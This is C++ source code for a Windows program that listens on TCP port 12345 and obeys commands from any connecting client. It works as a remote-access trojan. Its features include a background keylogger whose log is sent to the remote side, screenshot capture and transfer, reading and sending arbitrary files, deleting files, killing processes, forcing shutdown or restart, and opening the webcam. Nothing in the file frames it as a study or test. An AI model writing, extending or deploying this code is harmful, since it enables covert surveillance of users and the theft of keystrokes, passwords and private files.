#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <tlhelp32.h>
#include <gdiplus.h>

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")
using namespace std;

void Shutdown() {
    system("shutdown /s /t 0");
}

void Reset() {
    system("shutdown /r /t 0");
}

void ScreenShot(const string& filename, SOCKET client) {
    HWND hwnd = GetDesktopWindow();
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);

    RECT rect;
    GetClientRect(hwnd, &rect);
    int width = rect.right;
    int height = rect.bottom;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMemory, hBitmap);

    BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Negative to flip the image
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;

    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);

    GetDIBits(hdcScreen, hBitmap, 0, (UINT)height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFile(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwSizeofDIB;
    bmfHeader.bfType = 0x4D42; // BM

    DWORD dwBytesWritten;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    CloseHandle(hFile);

    DeleteObject(hBitmap);
    DeleteDC(hdcMemory);
    ReleaseDC(hwnd, hdcScreen);

    ifstream file(filename, ios::binary | ios::ate);
    if (!file.is_open()) {
        cerr << "Failed to open file: " << filename << endl;
        send(client, "ERROR", 5, 0);
        return;
    }

    streamsize fileSize = file.tellg();
    file.seekg(0, ios::beg);

    // Send file size
    send(client, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

    char buffer[1024];
    while (!file.eof()) {
        file.read(buffer, sizeof(buffer));
        int bytesRead = static_cast<int>(file.gcount());
        if (send(client, buffer, bytesRead, 0) == SOCKET_ERROR) {
            cerr << "Failed to send file: " << filename << endl;
            break;
        }
    }
    file.close();
    cout << "Screenshot saved and sent as BMP: " << filename << endl;
}

bool keyloggerActive = false;
ofstream keylogFile;

void KeyloggerStart() {
    keyloggerActive = true;
    keylogFile.open("keylogger.txt", ios::out | ios::app);
    if (!keylogFile.is_open()) {
        cerr << "Failed to open keylogger file." << endl;
        return;
    }

    while (keyloggerActive) {
        for (int key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) & 0x0001) {
                if ((key >= 39 && key <= 64) || (key >= 65 && key <= 90)) {
                    keylogFile << (char)key;
                }
                else {
                    switch (key) {
                    case VK_SPACE:
                        keylogFile << " ";
                        break;
                    case VK_RETURN:
                        keylogFile << "[ENTER]\n";
                        break;
                    case VK_BACK:
                        keylogFile << "[BACKSPACE]";
                        break;
                    case VK_TAB:
                        keylogFile << "[TAB]";
                        break;
                    case VK_SHIFT:
                        keylogFile << "[SHIFT]";
                        break;
                    case VK_CONTROL:
                        keylogFile << "[CTRL]";
                        break;
                    case VK_ESCAPE:
                        keylogFile << "[ESC]";
                        break;
                    default:
                        keylogFile << "[KEY: " << key << "]";
                    }
                }
                keylogFile.flush();
            }
        }
        Sleep(10);
    }
}

void KeyloggerStop(SOCKET client) {
    keyloggerActive = false;
    if (keylogFile.is_open()) {
        keylogFile.close();
    }

    ifstream file("keylogger.txt", ios::binary | ios::ate);
    if (!file.is_open()) {
        cerr << "Failed to open keylogger file for sending." << endl;
        send(client, "ERROR", 5, 0);
        return;
    }

    streamsize fileSize = file.tellg();
    file.seekg(0, ios::beg);

    // Send file size
    send(client, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

    char buffer[1024];
    while (!file.eof()) {
        file.read(buffer, sizeof(buffer));
        int bytesRead = static_cast<int>(file.gcount());
        if (send(client, buffer, bytesRead, 0) == SOCKET_ERROR) {
            cerr << "Failed to send keylogger file." << endl;
            break;
        }
    }
    file.close();
    cout << "Keylogger file sent successfully." << endl;
}

void ListProcesses(const char* outputFile, SOCKET client) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    ofstream file(outputFile);

    if (!file.is_open()) {
        send(client, "Failed to open file", 20, 0);
        return;
    }

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        file.close();
        send(client, "Failed to create snapshot", 24, 0);
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            file << "Process: " << pe32.szExeFile << "\n";
        } while (Process32Next(hProcessSnap, &pe32));
    }

    file.close();
    CloseHandle(hProcessSnap);

    ifstream inputFile(outputFile, ios::binary | ios::ate);
    if (inputFile.is_open()) {
        streamsize fileSize = inputFile.tellg();
        inputFile.seekg(0, ios::beg);
        send(client, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

        char buffer[1024];
        while (!inputFile.eof()) {
            inputFile.read(buffer, sizeof(buffer));
            send(client, buffer, static_cast<int>(inputFile.gcount()), 0);
        }
        inputFile.close();
    }
}

void StartApp(const string& appPath) {
    ShellExecute(0, "open", appPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
}

bool StopApp(const string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cerr << "Failed to create process snapshot." << endl;
        return false;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (_stricmp(processEntry.szExeFile, processName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
    return false;
}

void CopyFileTo(const char* source, const char* destination, SOCKET client) {
    ifstream file(source, ios::binary | ios::ate);
    if (!file.is_open()) {
        send(client, "Failed to open source file", 25, 0);
        return;
    }

    streamsize fileSize = file.tellg();
    file.seekg(0, ios::beg);
    send(client, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

    char buffer[1024];
    while (!file.eof()) {
        file.read(buffer, sizeof(buffer));
        send(client, buffer, static_cast<int>(file.gcount()), 0);
    }
    file.close();
}

void DeleteFileFrom(const char* filePath, SOCKET client) {
    if (DeleteFile(filePath)) {
        send(client, "File deleted successfully", 25, 0);
    }
    else {
        send(client, "Failed to delete file", 22, 0);
    }
}

void OpenWebcam(SOCKET client) {
    system("start microsoft.windows.camera:");
    send(client, "Webcam opened", 13, 0);
}

void ProcessCommand(const string& command, SOCKET client) {
    if (command == "SHUTDOWN") {
        Shutdown();
        send(client, "Shutdown success", 16, 0);
    }
    else if (command == "RESET") {
        Reset();
        send(client, "Reset success", 13, 0);
    }
    else if (command == "SCREENSHOT") {
        const string screenshotPath = "screenshot.bmp";
        ScreenShot(screenshotPath, client);
    }

    else if (command.rfind("START_APP", 0) == 0) {
        string appPath = command.substr(10);
        StartApp(appPath);
        send(client, "App started", 11, 0);
    }
    else if (command.rfind("STOP_APP", 0) == 0) {
        string appName = command.substr(9);
        if (StopApp(appName)) {
            send(client, "App stopped", 11, 0);
        }
        else {
            send(client, "Failed to stop app", 19, 0);
        }
    }
    else if (command == "KEYLOGGER_START") {
        thread keyloggerThread(KeyloggerStart);
        keyloggerThread.detach();
        send(client, "Keylogger started", 17, 0);
    }
    else if (command == "KEYLOGGER_STOP") {
        KeyloggerStop(client);
    }
    else if (command.rfind("COPY_FILE", 0) == 0) {
        size_t firstSpace = command.find(' ');
        size_t secondSpace = command.find(' ', firstSpace + 1);
        if (firstSpace != string::npos && secondSpace != string::npos) {
            string source = command.substr(firstSpace + 1, secondSpace - firstSpace - 1);
            string destination = command.substr(secondSpace + 1);
            CopyFileTo(source.c_str(), destination.c_str(), client);
        }
    }
    else if (command.rfind("DELETE_FILE", 0) == 0) {
        string filePath = command.substr(12);
        DeleteFileFrom(filePath.c_str(), client);
    }
    else if (command == "LIST_PROCESSES") {
        ListProcesses("process_list.txt", client);
    }
    else if (command == "OPEN_WEBCAM") {
        OpenWebcam(client);
    }
    else {
        send(client, "Unknown command", 16, 0);
    }
}

int main() {
    WSADATA wsaData;
    SOCKET server, client;
    sockaddr_in serverAddr, clientAddr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed with error: " << WSAGetLastError() << endl;
        return 1;
    }

    server = socket(AF_INET, SOCK_STREAM, 0);
    if (server == INVALID_SOCKET) {
        cerr << "Socket creation failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(12345);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Bind failed with error: " << WSAGetLastError() << endl;
        closesocket(server);
        WSACleanup();
        return 1;
    }

    if (listen(server, 5) == SOCKET_ERROR) {
        cerr << "Listen failed with error: " << WSAGetLastError() << endl;
        closesocket(server);
        WSACleanup();
        return 1;
    }

    int clientSize = sizeof(clientAddr);
    client = accept(server, (sockaddr*)&clientAddr, &clientSize);
    if (client == INVALID_SOCKET) {
        cerr << "Accept failed with error: " << WSAGetLastError() << endl;
        closesocket(server);
        WSACleanup();
        return 1;
    }

    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(client, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            cerr << "Connection closed or error occurred." << endl;
            break;
        }
        ProcessCommand(buffer, client);
    }

    closesocket(client);
    closesocket(server);
    WSACleanup();
    return 0;
}
